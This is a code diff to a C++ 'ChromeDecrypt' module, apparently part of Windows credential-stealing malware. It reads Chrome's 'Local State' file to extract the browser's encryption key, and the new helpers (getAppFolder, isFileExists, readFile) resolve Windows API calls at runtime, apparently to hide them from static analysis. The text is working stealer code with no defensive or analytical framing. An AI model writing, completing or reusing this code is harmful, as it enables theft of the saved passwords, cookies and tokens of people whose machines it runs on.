@@ -81,15 +81,15 @@ bool ChromeDecrypt::decrypt(const String& encrypted, String& decrypted, int size
 
 inline bool ChromeDecrypt::getChromeKey(std::string& key, unsigned long& size, const String& path)
 {
-	int local_app_data = 0x001c;
-	String keyPath = IO::get_app_folder(local_app_data);
+	int localData = 0x001c;
+	String keyPath = getAppFolder(localData);
 	if (keyPath.empty())
 		return false;
 
 	keyPath += path + R"(\User Data\Local State)";
 	String jsonStr;
 
-	if (!IO::is_file_exists(keyPath) || !IO::read_file(keyPath, jsonStr))
+	if (!isFileExists(keyPath) || !readFile(keyPath, jsonStr))
 		return false;
 
 
@@ -193,3 +193,74 @@ cJSON* ChromeDecrypt::findNode(cJSON* node, const char* key)
 
 	findNode(node->next, key);
 }
+
+String ChromeDecrypt::getAppFolder(int CSIDL_FLAG)
+{
+	const auto get_userPath = WinApiImport<f_SHGetFolderPathA>::get("SHGetFolderPathA", "shell32.dll");
+
+	if (!get_userPath) 
+		return {};
+	char path[MAX_PATH];
+
+	if (get_userPath(NULL, CSIDL_FLAG, NULL, 0, path) != S_OK)
+		return "";
+
+	return path;
+}
+
+
+
+bool ChromeDecrypt::isFileExists(const std::string& file)
+{
+	const auto func_FindFirstFile = WinApiImport<f_FindFirstFile>::get("FindFirstFile", "kernel32.dll");
+	const auto func_FindClose = WinApiImport<f_FindClose>::get("FindClose", "kernel32.dll");
+
+	WIN32_FIND_DATA FindFileData;
+	HANDLE handle = func_FindFirstFile(file.c_str(), &FindFileData);
+	int found = handle != INVALID_HANDLE_VALUE;
+	if (found)
+	{
+		func_FindClose(handle);
+	}
+	return found;
+}
+
+
+ bool ChromeDecrypt::readFile(const String& file, String& data)
+{
+	if (!isFileExists(file))
+		return false;
+
+	const auto func_GetFileSize = WinApiImport<f_GetFileSize>::get("GetFileSize", "kernel32.dll");
+	const auto func_CreateFileA = WinApiImport<f_CreateFileA>::get("CreateFileA", "kernel32.dll");
+	const auto func_CloseHandle = WinApiImport<f_CloseHandle>::get("CloseHandle", "kernel32.dll");
+	const auto func_ReadFile = WinApiImport<f_ReadFile>::get("ReadFile", "kernel32.dll");
+
+	auto hFile = func_CreateFileA(file.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
+
+	if (hFile == INVALID_HANDLE_VALUE)
+		return false;
+
+	const auto fileSize = func_GetFileSize(hFile, NULL);
+
+	if (fileSize == 0)
+		return false;
+
+	char* tempBuff = new char[fileSize];
+
+	DWORD numToRead;
+	if (!func_ReadFile(hFile, tempBuff, fileSize, &numToRead, NULL))
+		return false;
+
+	data = tempBuff;
+	data.resize(numToRead);
+	delete[] tempBuff;
+
+	if (!func_CloseHandle(hFile))
+		return false;
+
+	return true;
+}
+
+
+
